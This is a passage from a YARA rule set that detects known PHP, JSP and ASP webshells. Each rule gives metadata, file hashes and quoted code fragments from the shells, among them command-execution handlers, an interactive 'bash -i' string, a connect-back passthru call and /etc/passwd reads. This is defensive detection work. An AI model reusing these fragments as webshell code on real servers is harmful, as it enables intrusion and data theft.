		logic_hash = "3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Spygrup
{
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6390-L6404"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		logic_hash = "5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Web_Shell__C_Shankar
{
	meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "966f5580-21c5-5ecf-b500-bde3d1ba4494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6405-L6419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
		logic_hash = "9d320eed18a5d76a87cee4ea0fa9caf08f096f7eeaab55420540aa082b596e0f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Gamma_Web_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6435-L6449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Aspydrv
{
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6450-L6465"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		logic_hash = "314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "659f5c7d-0a9c-554d-a0ad-e3bcb8c5a1e9"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6466-L6481"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
		logic_hash = "41d937fce969a850a2e4e07eb168becc96a036317a78d620e812707be9466dfc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_G00Nshell_V1_3
{
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6482-L6497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		logic_hash = "2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Winx_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ebad4f2e-96c3-5cb7-b228-de3a6a39ae55"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_WinX_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6498-L6514"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
		logic_hash = "f953c297763e41d197ce186dc818b656951dfa8c855c5063fc4abb54eeefc7bb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_PHANTASMA
{
	meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b36a7dbb-7d40-5fca-8409-c8822298005c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6515-L6529"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
		logic_hash = "355be62807182f9a53bac20a6dead8f0a3bee83b6bdc4566502c157f16076b9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cw
{
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6530-L6546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		logic_hash = "52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Include_W_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6547-L6560"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		logic_hash = "2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Tool
{
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6561-L6573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		logic_hash = "611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Phpspy_Ver_2006
{
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth (Nextron Systems)"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6574-L6588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		logic_hash = "69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Zyklonshell
{
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6589-L6603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		logic_hash = "5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lolipop
{
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6620-L6633"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		logic_hash = "8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Simple_Cmd
{
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6634-L6648"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		logic_hash = "82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0_2
{
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6665-L6680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		logic_hash = "8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lostdc
{
	meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6709-L6724"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
		logic_hash = "e3cd28f4a72f5a8a92c728fe76a7159c28256e87daf4c1dd10190a57263f5b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Casus_1_5
{
	meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "cf89d8f8-d498-57fe-98eb-a98350db182f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6725-L6738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
		logic_hash = "0dbaa39bd33047d24e5bc9716108c5581da3f54e93d90f9c550b3d84de1ebfe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Ftpsearch
{
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6739-L6753"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		logic_hash = "6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Cyber_Shell_Cybershell_Cyber_Shell__V_1_0_
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth (Nextron Systems)"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6754-L6771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_Soldierofallah
{
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6772-L6792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_7
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "506373d6-31b4-5a14-b009-f2b43028a98b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6793-L6811"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d9b6b1333f2061c357fad110b5cc508288c70aea1212aa2fcbf283a2ce4fb2c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"

	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Small_Web_Shell_By_Zaco_Small_Zaco_Zacosmall
{
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6812-L6830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
